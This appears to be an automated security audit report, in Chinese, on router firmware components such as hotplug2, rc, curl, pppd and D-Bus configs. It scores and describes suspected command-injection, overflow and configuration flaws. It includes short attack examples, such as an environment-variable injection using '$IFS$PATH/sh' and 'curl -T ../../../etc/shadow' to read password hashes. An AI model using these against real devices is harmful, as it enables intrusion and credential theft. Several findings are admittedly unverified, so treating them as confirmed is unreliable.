- **位置:** `sbin/hotplug2:0xad60`
- **类型:** command_execution
- **综合优先级分数:** **7.95**
- **风险等级:** 8.0
- **置信度:** 8.5
- **触发可能性:** 7.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 环境变量污染导致的二级命令注入。触发条件：1) 规则文件包含SETENV_ACTION后接SYSTEM_ACTION序列 2) SYSTEM_ACTION命令引用SETENV设置的变量。漏洞原理：a) SETENV_ACTION直接使用规则数据设置环境变量 b) SYSTEM_ACTION执行时shell解析$变量引用。攻击者可构造：SETENV_ACTION设置'PATH=/tmp;'后执行'$IFS$PATH/sh'实现注入。实际风险取决于热插拔事件频率及环境变量可控性（如通过恶意USB设备）。
- **代码片段:**
  ```
  case 0xb: setenv(**(iVar12+4), (*(iVar12+4))[1], 1);
  case 0: system(fcn.0000a73c(**(iVar12+4), param_1));
  ```
- **关键词:** SETENV_ACTION, SYSTEM_ACTION, setenv, $IFS
- **备注:** 需动态测试USB热插拔事件中环境变量的可控性。与发现1共享fcn.0000a73c污染点。

---
### config_tamper-rc-0x0000ee20

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x0000ee20`
- **类型:** file_write
- **综合优先级分数:** **7.85**
- **风险等级:** 8.0
- **置信度:** 8.5
- **触发可能性:** 6.5
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 配置文件篡改漏洞：在fcn.0000ed80(0x0000ee20)中，通过fopen以写模式打开*0xff30路径文件，并写入*0xff08控制的23字节内容。触发条件：nvram_get(*0xfd54)返回特定值且后续strcmp匹配。漏洞点：写入内容完全由NVRAM控制且无校验，可导致关键配置被恶意覆盖。
- **代码片段:**
  ```
  iVar2 = sym.imp.fopen(*0xff30,*0xff34);
  sym.imp.fwrite(*0xff08,1,0x23,iVar2);
  ```
- **关键词:** fopen, fwrite, *0xff30, *0xff08, nvram_get, *0xfd54

---
### curl-T-parameter-arbitrary-read

- **文件路径:** `sbin/curl`
- **位置:** `getparameter:0x0000e308, operate_do:0x00011bec`
- **类型:** network_input
- **综合优先级分数:** **7.8**
- **风险等级:** 7.5
- **置信度:** 8.5
- **触发可能性:** 7.5
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** curl的-T参数处理存在任意文件读取漏洞：在getparameter函数(case 0x1e)中，用户提供的文件路径未经规范化直接传递给open64()。攻击者可通过'-T ../../../etc/shadow'读取敏感文件。触发条件：1) 攻击者控制curl参数 2) curl进程有目标文件读权限。在固件中可能泄露密码哈希或配置密钥。
- **代码片段:**
  ```
  uVar5 = sym.imp.open64(*(puVar22 + -0x10), iVar9 + 0);
  ```
- **关键词:** getparameter, case 0x1e, open64, operate_do, -T, upload, curl
- **备注:** 关联函数glob_url；建议后续检查固件文件权限模型。常见路径：/usr/bin/curl或/sbin/curl

---
### nvram_get-rc-time_zone_env_hijack

- **文件路径:** `sbin/rc`
- **位置:** `sbin/rc:0x108ac (main)`
- **类型:** nvram_get
- **综合优先级分数:** **7.8**
- **风险等级:** 7.0
- **置信度:** 9.0
- **触发可能性:** 8.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** NVRAM变量'time_zone'污染导致环境变量劫持：在main函数0x108ac处，nvram_get("time_zone")返回值未经过滤直接通过setenv("TZ", value, 1)设置环境变量。攻击者通过篡改NVRAM（如通过HTTP接口）可控制TZ变量，影响时间敏感服务。触发条件：系统初始化时自动执行rc脚本。
- **关键词:** time_zone, nvram_get, setenv, TZ, main
- **备注:** 需验证glibc时间函数对TZ的依赖程度；关联知识库备注：需对/usr/libexec/dbus-daemon-launch-helper进行二进制分析

---
### cmd_injection-leafp2p_service-fcn1728c

- **文件路径:** `sbin/system`
- **位置:** `fcn.0001728c`
- **类型:** command_execution
- **综合优先级分数:** **7.75**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 8.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** leafp2p.sh服务控制风险：system文件通过system函数直接执行`sh /etc/init.d/leafp2p.sh start/stop`。触发条件：网络配置变更（如PPPoE连接）。安全影响：1) 若命令构建参数（如pcVar10）被污染，可注入恶意命令 2) 结合NVRAM污染链形成二次攻击。边界检查：未发现输入过滤。
- **代码片段:**
  ```
  sym.imp.sprintf(iVar18,*0x16eec,pcVar10,uVar13);
  sym.imp.system(iVar18);
  ```
- **关键词:** system, sprintf, sh /etc/init.d/leafp2p.sh start, leafp2p_run
- **备注:** 关联文件：/etc/init.d/leafp2p.sh（需分析其是否存在命令注入风险）。污染源可能来自环境变量或NVRAM。

---
### nvram_get-ubdcmd-wan_config

- **文件路径:** `sbin/ubdcmd`
- **位置:** `ubdcmd:0x91b4`
- **类型:** nvram_get
- **综合优先级分数:** **7.65**
- **风险等级:** 7.0
- **置信度:** 8.5
- **触发可能性:** 8.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** NVRAM变量处理缺陷：通过acosNvramConfig_get获取的变量(wan_proto/wan_mtu)未经验证直接使用。触发条件：污染NVRAM变量后执行网络配置相关功能。具体表现：1) 字符串直接atoi转换 → 非数字输入导致逻辑错误 2) 转换后整数参与运算 → 超大值引发整数溢出。安全影响：配置篡改/服务崩溃。约束检查：无输入过滤或边界校验。
- **代码片段:**
  ```
  bl acosNvramConfig_get(wan_mtu)
  bl atoi  ; 无长度检查
  sub r0, r0, #10 ; 直接参与运算
  ```
- **关键词:** acosNvramConfig_get, wan_proto, wan_mtu, atoi, fcn.000091b4
- **备注:** 需全局追踪NVRAM污染向量；关联atoi（多链共用转换函数）

---
### configuration_load-readydropd-httpd_admin_privilege

- **文件路径:** `www/cgi-bin/readydropd.conf`
- **位置:** `www/cgi-bin/readydropd.conf`
- **类型:** configuration_load
- **综合优先级分数:** **7.65**
- **风险等级:** 7.5
- **置信度:** 9.0
- **触发可能性:** 6.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** httpd_user配置为admin高权限账户但未定义权限边界，若服务存在漏洞（如缓冲区溢出），攻击者可能直接获取admin权限。触发条件：通过网络接口或IPC发送恶意数据触发漏洞
- **代码片段:**
  ```
  httpd_user = admin
  httpd_group = admin
  ```
- **关键词:** httpd_user, admin, httpd_group
- **备注:** 建议检查进程实际权限（通过系统启动脚本验证）

---
### buffer_overflow-env_path_concatenation-fcn17360

- **文件路径:** `sbin/system`
- **位置:** `fcn.00017360`
- **类型:** env_get
- **综合优先级分数:** **7.6**
- **风险等级:** 8.0
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 环境变量路径拼接漏洞：函数fcn.00017360中环境变量值(iVar9)直接用于strcat路径拼接（目标缓冲区acStack_254[256]）。触发条件：1) 攻击者控制环境变量值 2) 值长度超过缓冲区剩余空间。边界检查：无长度验证机制。可利用性：通过构造超长环境变量值触发缓冲区溢出，可能覆盖返回地址或函数指针。
- **代码片段:**
  ```
  strcat(puVar8,iVar9);
  iVar1 = sym.imp.fopen(puVar8,*0x17968);
  ```
- **关键词:** strcat, acStack_254, iVar9, fopen, getenv
- **备注:** 需验证：1) puVar8初始内容 2) 最大可溢出长度 3) 栈保护机制状态。与NVRAM污染链可能形成组合漏洞。

---
### nvram_set-leafp2p-port_config

- **文件路径:** `etc/init.d/remote.sh`
- **位置:** `etc/init.d/remote.sh:21-72`
- **类型:** nvram_set
- **综合优先级分数:** **7.55**
- **风险等级:** 7.0
- **置信度:** 9.5
- **触发可能性:** 6.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 通过9组nvram_set操作初始化leafp2p服务配置（如leafp2p_service_0），当NVRAM值为空时设置包含高危端口(135/136/445/548)的默认值。触发条件：服务启动时自动执行。攻击者可通过污染NVRAM控制服务行为，但需要先获取NVRAM写权限。
- **代码片段:**
  ```
  ${nvram} set leafp2p_service_0="RouterRemote,0,1,1,1,1,6:135,6:136,6:137,6:138,6:139,6:445,17:548"
  ```
- **关键词:** nvram get, nvram set, nvram commit, leafp2p_service_0, leafp2p_remote_url
- **备注:** 需验证端口是否实际开放，建议后续：1) 扫描服务端口 2) 检查NVRAM写保护机制

---
### attack_chain-pppd_hotplug2-env_injection

- **文件路径:** `sbin/pppd`
- **位置:** `跨组件: sbin/pppd → sbin/hotplug2`
- **类型:** ipc
- **综合优先级分数:** **7.55**
- **风险等级:** 8.5
- **置信度:** 7.0
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 跨组件环境变量污染攻击链（待验证）：1) pppd通过script_setenv设置SPEED等变量 2) 变量通过/bin/sh传递给/tmp/ppp/ip-up脚本 3) 若脚本未过滤变量引用（如$PATH）且变量值被污染 4) 可能触发hotplug2组件的SETENV_ACTION/SYSTEM_ACTION漏洞（CVE-XXXX）。关键验证点：a) SPEED值是否受网络输入控制 b) ip-up脚本是否执行'$VAR'形式命令 c) 环境变量在进程间传递机制。
- **代码片段:**
  ```
  N/A (跨组件交互)
  ```
- **关键词:** script_setenv, SETENV_ACTION, SYSTEM_ACTION, /tmp/ppp/ip-up, SPEED, $IFS
- **备注:** 关联发现：1) pppd环境变量注入风险（command_execution-pppd_script_env-injection_risk） 2) hotplug2命令注入（command_injection-hotplug2-env_pollution）。验证优先级：检查/tmp/ppp/ip-up脚本内容

---
### cmd_injection-nvram_loop_exec-fcn1728c

- **文件路径:** `sbin/system`
- **位置:** `fcn.0001728c+0x16ac0`
- **类型:** nvram_get
- **综合优先级分数:** **7.45**
- **风险等级:** 8.0
- **置信度:** 7.5
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** NVRAM循环命令执行风险：在fcn.0001728c+0x16ac0处，NVRAM值通过getTokens分割后循环执行system命令。触发条件：NVRAM值包含分号等命令分隔符。边界检查：无危险字符过滤。可利用性：单次污染触发多条命令执行，放大攻击影响。
- **代码片段:**
  ```
  uVar13 = sym.imp.acosNvramConfig_get(...);
  iVar18 = sym.imp.getTokens(uVar13,...);
  do {
    sym.imp.system(iVar3);
  } while(...);
  ```
- **关键词:** acosNvramConfig_get, getTokens, system
- **备注:** 需分析token分割逻辑，确认是否允许命令分隔符保留。与主注入点共享污染源。

---
### command_execution-afpd-send_wol_background

- **文件路径:** `etc/init.d/afpd`
- **位置:** `etc/init.d/afpd:14`
- **类型:** command_execution
- **综合优先级分数:** **7.35**
- **风险等级:** 6.5
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 脚本启动send_wol服务（/usr/sbin/send_wol）在后台运行，发送WOL包。触发条件：系统启动或手动执行'/etc/init.d/afpd start'。该服务暴露网络攻击面，攻击者可能发送伪造WOL包或利用其漏洞进行拒绝服务攻击。MAXCONS=7参数直接使用无边界检查，但未实际用于afpd服务。
- **代码片段:**
  ```
  /usr/sbin/send_wol 300 &
  ```
- **关键词:** send_wol, start(), MAXCONS, /usr/sbin/send_wol
- **备注:** 需单独分析send_wol二进制验证实际风险；关联发现：cmd_injection-nvram_leafp2p_sys_prefix（etc/init.d/leafp2p.sh）。若攻击者通过NVRAM污染实现任意命令执行，可能操控本服务。

---
### configuration_load-dbus_system_policy_include

- **文件路径:** `etc/system.conf`
- **位置:** `etc/system.conf`
- **类型:** configuration_load
- **综合优先级分数:** **7.35**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** D-Bus系统总线配置文件暴露策略包含机制：通过<includedir>system.d</includedir>指令加载外部策略文件。若攻击者能篡改system.d目录下的策略文件(如通过路径遍历或弱权限)，可覆盖默认安全策略(deny own="*"等)。成功利用需满足：1) system.d目录权限配置不当 2) 存在文件写入漏洞。影响包括：普通用户可注册恶意服务、发送未授权方法调用，实现权限提升或系统控制。
- **代码片段:**
  ```
  <includedir>system.d</includedir>
  <policy context="default">
    <deny own="*"/>
    <deny send_type="method_call"/>
  </policy>
  ```
- **关键词:** includedir>system.d, deny own="*", deny send_type="method_call", policy context="default"
- **备注:** 需验证system.d目录权限设置及策略文件完整性。后续应分析：1) /etc/dbus-1/system.d目录权限 2) 各服务策略文件内容

---
### configuration_load-dbus_privileged_servicehelper

- **文件路径:** `etc/system.conf`
- **位置:** `etc/system.conf`
- **类型:** configuration_load
- **综合优先级分数:** **7.25**
- **风险等级:** 8.0
- **置信度:** 7.5
- **触发可能性:** 5.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 特权服务启动器路径配置：servicehelper指向高权限二进制文件/usr/libexec/dbus-daemon-launch-helper。该组件以root权限运行，若存在漏洞(如缓冲区溢出)，结合D-Bus消息传递机制可形成完整攻击链。触发条件：1) 该二进制存在内存破坏漏洞 2) 攻击者能构造恶意D-Bus消息。影响包括直接获取root权限，因该助手负责启动系统级服务。
- **代码片段:**
  ```
  <servicehelper>/usr/libexec/dbus-daemon-launch-helper</servicehelper>
  ```
- **关键词:** servicehelper>/usr/libexec/dbus-daemon-launch-helper, auth>EXTERNAL, listen>unix:path=/var/run/system_bus_socket
- **备注:** 需对/usr/libexec/dbus-daemon-launch-helper进行二进制分析。攻击面包括：通过本地进程间通信(IPC)传递恶意数据触发漏洞

---
### curl-config-insecure-load

- **文件路径:** `sbin/curl`
- **位置:** `getparameter:0x0000e308`
- **类型:** network_input
- **综合优先级分数:** **7.1**
- **风险等级:** 7.0
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** curl的--config参数存在不安全加载漏洞：用户指定的配置文件路径在getparameter函数(case 0x28)中直接传递给parseconfig()，未防御路径遍历攻击（如'--config ../../tmp/evil.conf'）。恶意配置可篡改SSL证书验证等安全设置。触发条件：攻击者能控制配置文件路径和内容。
- **代码片段:**
  ```
  iVar5 = sym.parseconfig(param_2, param_4);
  ```
- **关键词:** getparameter, case 0x28, parseconfig, --config, curl
- **备注:** 需深入分析parseconfig函数；关联高危操作：CURLOPT_SSL_VERIFYPEER。常见路径：/usr/bin/curl或/sbin/curl

---
### command_execution-pppd_script_env-injection_risk

- **文件路径:** `sbin/pppd`
- **位置:** `sbin/pppd: script_setenv (具体偏移待分析)`
- **类型:** command_execution
- **综合优先级分数:** **7.1**
- **风险等级:** 7.5
- **置信度:** 6.5
- **触发可能性:** 7.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 环境变量注入潜在风险：script_setenv设置的变量(如SPEED)通过/bin/sh传递给/tmp/ppp/ip-up脚本。若变量值被污染且脚本未过滤，可导致命令注入。触发条件：PPP连接状态变更时自动执行脚本。当前证据不足，需验证：1) SPEED值来源是否外部可控 2) ip-up脚本是否存在危险变量引用。
- **关键词:** script_setenv, connect_tty, SPEED, device_script, execl, /tmp/ppp/ip-up, CONNECT_TIME
- **备注:** 后续分析方向：1) 检查/tmp/ppp/ip-up脚本内容 2) 动态追踪SPEED值来源 3) 关联知识库中的'setenv'关键词

---

## 低优先级发现

### config-permission-avahi-dbus-setHostName

- **文件路径:** `etc/avahi-dbus.conf`
- **位置:** `etc/dbus-1/system.d/avahi-dbus.conf: [策略配置]`
- **类型:** configuration_load
- **综合优先级分数:** **6.75**
- **风险等级:** 6.5
- **置信度:** 9.0
- **触发可能性:** 4.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** avahi-dbus.conf配置存在权限提升风险：默认策略显式拒绝所有用户调用SetHostName方法(<deny send_member="SetHostName"/>)，但admin组成员被授予无限制访问权限(<allow group="admin"/>)。这导致：1) admin组成员可绕过安全限制调用敏感方法 2) 若SetHostName存在漏洞(如缓冲区溢出)，攻击者获取admin组权限即可触发 3) 实际风险取决于SetHostName的实现安全性，但因无法定位avahi-daemon二进制文件，无法验证具体漏洞存在性和边界检查情况。
- **代码片段:**
  ```
  <policy context="default">
    <deny send_member="SetHostName"/>
  </policy>
  <policy group="admin">
    <allow send_destination="org.freedesktop.Avahi"/>
  </policy>
  ```
- **关键词:** org.freedesktop.Avahi.Server, SetHostName, <policy>, <allow group="admin"/>, <deny send_member="SetHostName"/>, avahi-dbus.conf, admin权限提升
- **备注:** 关键局限：avahi-daemon二进制文件缺失导致：1) 无法验证SetHostName参数是否进行长度检查 2) 无法检测是否存在缓冲区溢出/命令注入风险 3) 无法评估主机名处理逻辑安全性。建议条件允许时优先定位avahi服务相关二进制文件。

---
### configuration_load-url_injection-fcn_0000a3c0

- **文件路径:** `www/cgi-bin/genie.cgi`
- **位置:** `genie.cgi:0x14a (fcn.00009ef8)`
- **类型:** configuration_load
- **综合优先级分数:** **6.4**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 配置源URL注入风险：param_2参数通过fcn.0000a3c0(0x3954)获取，用于snprintf构建请求URL。若0x3954对应配置项可被污染（如通过NVRAM设置），可构造恶意URL。触发条件：攻击者通过其他接口污染配置源。实际影响：可能导致SSRF攻击或内部服务探测。
- **关键词:** fcn.0000a3c0, 0x3954, param_2, snprintf, %s?t=%s&d=%s&c=%s
- **备注:** 需追踪0x3954地址对应的配置项及其设置接口；可能与现有nvram set操作存在污染路径关联

---
### nvram_pollution-openvpnActive

- **文件路径:** `sbin/system`
- **位置:** `sbin/system:0 (acos_service) 0x12800`
- **类型:** nvram_get
- **综合优先级分数:** **6.15**
- **风险等级:** 6.5
- **置信度:** 7.0
- **触发可能性:** 4.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** NVRAM污染传播风险：关键参数'openvpnActive'通过acosNvramConfig_get获取后直接控制服务启动（system("openvpn-start")）。触发条件：攻击者污染该参数值（如设置为非零）。安全影响：1) 未授权启动OpenVPN服务 2) 结合其他漏洞形成利用链。边界检查缺失但直接污染路径未确认。
- **代码片段:**
  ```
  iVar1 = sym.imp.acosNvramConfig_get(*0x12a8c);
  if (iVar1 != 0) {
      sym.imp.system(*0x12ac8); // openvpn-start
  }
  ```
- **关键词:** openvpnActive, acosNvramConfig_get, system, openvpn-start
- **备注:** 潜在利用链组件：需验证污染入口

---
### potential_chain-http_to_popen-QUERY_STRING_param1

- **文件路径:** `www/cgi-bin/genie.cgi`
- **位置:** `关联位置：www/cgi-bin/genie.cgi (QUERY_GET处理) → 未知二进制 (危险函数调用)`
- **类型:** network_input
- **综合优先级分数:** **6.1**
- **风险等级:** 8.0
- **置信度:** 7.0
- **触发可能性:** N/A
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** 基于关联分析构建的攻击链：1) 输入源：HTTP请求中的QUERY_STRING参数（参见genie.cgi发现） 2) 传播路径：通过param_1变量传递 3) 危险操作：popen执行命令+nvram_get获取配置+strncpy边界缺失。触发条件：攻击者操控QUERY_STRING注入命令或超长数据。实际影响：命令注入导致RCE或缓冲区溢出。限制：因符号缺失未验证完整控制流，需动态测试确认。
- **关键词:** QUERY_STRING, param_1, popen, nvram_get, strncpy, genie.cgi
- **备注:** 关联依据：1) genie.cgi发现证明QUERY_STRING可控且关联param_1 2) 新分析证实param_1流入危险函数。待验证：param_1到popen/nvram_get的具体数据流。补充建议：优先动态追踪genie.cgi的param_1传递路径

---
### command_injection-rc-fcn1c1fc_mount

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x1c5f4 (fcn.0001c1fc)`
- **类型:** configuration_load
- **综合优先级分数:** **5.9**
- **风险等级:** 6.0
- **置信度:** 7.0
- **触发可能性:** 4.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 动态system命令注入风险：在fcn.0001c1fc函数0x1c5f4处，sprintf构建的system命令参数(iVar8)来自挂载路径。攻击者若能篡改挂载路径（需文件系统权限）可注入命令。风险低于直接输入污染。
- **关键词:** system, sprintf, fcn.0001c1fc, mount, *0x1c738

---
### file_write-afpd-applevolumes_config

- **文件路径:** `etc/init.d/afpd`
- **位置:** `etc/init.d/afpd:4-6`
- **类型:** file_write
- **综合优先级分数:** **5.7**
- **风险等级:** 5.0
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 启动时创建AFP_CONF_DIR=/tmp/netatalk目录并复制AppleVolumes.default配置文件。触发条件：服务启动时自动执行。若攻击者能篡改源文件(/usr/config/netatalk/AppleVolumes.default)或目标路径，可能植入恶意配置。目录创建未验证路径安全性，存在路径遍历风险。
- **关键词:** AFP_CONF_DIR, /tmp/netatalk, /usr/config/netatalk/AppleVolumes.default
- **备注:** 需验证配置文件内容是否包含用户可控参数

---
### configuration_load-readydropd-log_level_info_leak

- **文件路径:** `www/cgi-bin/readydropd.conf`
- **位置:** `www/cgi-bin/readydropd.conf`
- **类型:** configuration_load
- **综合优先级分数:** **5.7**
- **风险等级:** 5.0
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 6.5
- **阶段:** N/A
- **描述:** 日志级别设置为最高(level=2)，在调试模式下可能记录敏感数据（如用户凭证）。若日志文件权限配置不当（如全局可读），可导致信息泄露。触发条件：攻击者访问日志存储路径
- **代码片段:**
  ```
  log_level = 2
  ```
- **关键词:** log_level
- **备注:** 需确认日志存储路径（建议检查log_path配置项）

---
### nvram-env-propagation-0x108a8

- **文件路径:** `sbin/init`
- **位置:** `init:0x108a8 main`
- **类型:** nvram_get
- **综合优先级分数:** **3.9**
- **风险等级:** 2.0
- **置信度:** 7.0
- **触发可能性:** 4.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 存在NVRAM到环境变量的数据传播路径：nvram_get返回值通过setenv设置环境变量，该变量被getenv读取并与固定字符串比较（strcmp）。触发条件：攻击者需控制NVRAM存储内容。安全影响有限：比较结果仅影响条件跳转，未传播至system/exec等危险函数。
- **关键词:** nvram_get, setenv, getenv, strcmp
- **备注:** 无法解析具体NVRAM键名和环境变量名（地址内容获取失败）。需关联知识库中'NVRAM_set'、'script_setenv'等关键词验证完整路径

---
### ipc-afpd-reload_update_afp

- **文件路径:** `etc/init.d/afpd`
- **位置:** `etc/init.d/afpd`
- **类型:** ipc
- **综合优先级分数:** **3.5**
- **风险等级:** 4.0
- **置信度:** 3.0
- **触发可能性:** 3.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** reload()函数调用未定义的update_afp函数（可能位于/etc/rc.common）。触发条件：执行'/etc/init.d/afpd reload'。若该函数存在漏洞（如命令注入），攻击者可能通过重载操作触发。当前无证据验证其实现。
- **关键词:** reload(), update_afp, /etc/rc.common
- **备注:** 需分析/etc/rc.common验证update_afp实现

---
### static-system-call-0x10cb8

- **文件路径:** `sbin/init`
- **位置:** `init:0x10cb8 main`
- **类型:** command_execution
- **综合优先级分数:** **3.4**
- **风险等级:** 1.0
- **置信度:** 9.0
- **触发可能性:** 1.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** 发现system调用点（0x10cb8），参数来自硬编码地址*0x10cb8，未受外部输入污染。未发现exec家族函数调用。无边界检查问题，因参数完全静态。
- **关键词:** system

---
### configuration_load-pppd_path_traversal-mitigation

- **文件路径:** `sbin/pppd`
- **位置:** `sbin/pppd: sym.options_for_tty (具体偏移待分析)`
- **类型:** configuration_load
- **综合优先级分数:** **3.2**
- **风险等级:** 1.0
- **置信度:** 9.0
- **触发可能性:** 0.0
- **查询相关性:** 7.5
- **阶段:** N/A
- **描述:** 配置文件路径遍历缓解机制：外部输入(如PPPoE服务名)用于生成配置文件路径时，通过字符替换(‘/’→‘.’)有效防御路径遍历。触发条件：服务名含../等恶意字符。实际影响：过滤机制可靠，无路径遍历风险。
- **关键词:** sym.options_for_tty, slprintf, /tmp/ppp/options.%s/%s.ppp, 字符替换循环

---
### argv-validation-0x107b8

- **文件路径:** `sbin/init`
- **位置:** `init:0x107b8 main`
- **类型:** network_input
- **综合优先级分数:** **3.1**
- **风险等级:** 1.0
- **置信度:** 8.0
- **触发可能性:** 1.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 命令行参数解析逻辑完备：使用strstr/strcmp严格验证argv[0]和argv[1]内容，所有分支指向固定功能（如mtd_erase/mtd_write）。未发现参数验证缺失或边界检查缺陷。
- **关键词:** strstr, strcmp, strncmp, argv

---
### analysis_limitation-sbin_preinit-unreadable

- **文件路径:** `sbin/preinit`
- **位置:** `sbin/preinit`
- **类型:** analysis_limitation
- **综合优先级分数:** **3.0**
- **风险等级:** 0.0
- **置信度:** 10.0
- **触发可能性:** 0.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 无法分析'sbin/preinit'文件：连续两次工具调用(TaskDelegator)均未能获取文件内容。证据缺失原因可能是工具执行限制或文件访问异常。根据'证据为本'原则，在无实际文件内容支持的情况下，无法进行任何有效安全分析或攻击路径追踪。
- **关键词:** preinit
- **备注:** 建议后续操作：1) 验证文件是否损坏或加密；2) 尝试其他分析工具直接读取；3) 若该文件是系统关键组件，其不可分析状态本身可能构成安全隐患

---
### tz_env-rc-0x00011094

- **文件路径:** `sbin/rc`
- **位置:** `rc:0x00011094`
- **类型:** env_get
- **综合优先级分数:** **2.95**
- **风险等级:** 0.5
- **置信度:** 9.0
- **触发可能性:** 0.0
- **查询相关性:** 7.0
- **阶段:** N/A
- **描述:** TZ环境变量分析结论：在rc文件中未发现有效数据流。此前报告的getenv('TZ')调用(fcn.00011094)中：1) 获取的值仅存入栈变量auStack_424 2) 未用于后续危险操作(如execve环境) 3) 无缓冲区溢出风险。排除当前文件利用可能。
- **关键词:** TZ, getenv, auStack_424, fcn.00011094

---
### unverified_items-config_check

- **文件路径:** `sbin/system`
- **位置:** `N/A`
- **类型:** configuration_load
- **综合优先级分数:** **2.85**
- **风险等级:** 0.0
- **置信度:** 9.5
- **触发可能性:** 0.0
- **查询相关性:** 6.0
- **阶段:** N/A
- **描述:** 未验证项目：1) 配置项0x3954在system文件中无任何引用 2) ${SYS_PREFIX}/bin/checkleafnets.sh路径未被引用 3) SYS_PREFIX环境变量操作未发现直接证据。证据缺口：跨目录文件存在性验证超出工具权限。
- **关键词:** 0x3954, checkleafnets.sh, SYS_PREFIX, getenv
- **备注:** 后续建议：1) 分析www目录验证web接口的NVRAM设置点 2) 检查/bin/checkleafnets.sh是否存在及调用方 3) 审查固件启动脚本的环境变量初始化

---
### analysis_failure-hotplug-input_validation

- **文件路径:** `sbin/hotplug`
- **位置:** `sbin/hotplug:0 (unknown)`
- **类型:** hardware_input
- **综合优先级分数:** **0.0**
- **风险等级:** 0.0
- **置信度:** 0.0
- **触发可能性:** 0.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 分析任务因技术原因失败：无法获取 'sbin/hotplug' 文件内容。导致无法验证：1) 热插拔事件输入源($ACTION/$DEVPATH等)的处理逻辑；2) 外部输入是否用于危险命令执行；3) 与固件组件(nvram/iptables)的交互安全性。实际安全影响无法评估。
- **关键词:** hotplug, ACTION, DEVPATH, SUBSYSTEM
- **备注:** 需人工介入获取文件内容后重新分析。建议后续：1) 检查文件系统提取完整性；2) 尝试其他工具读取脚本；3) 优先分析同目录下其他热插拔相关文件

---
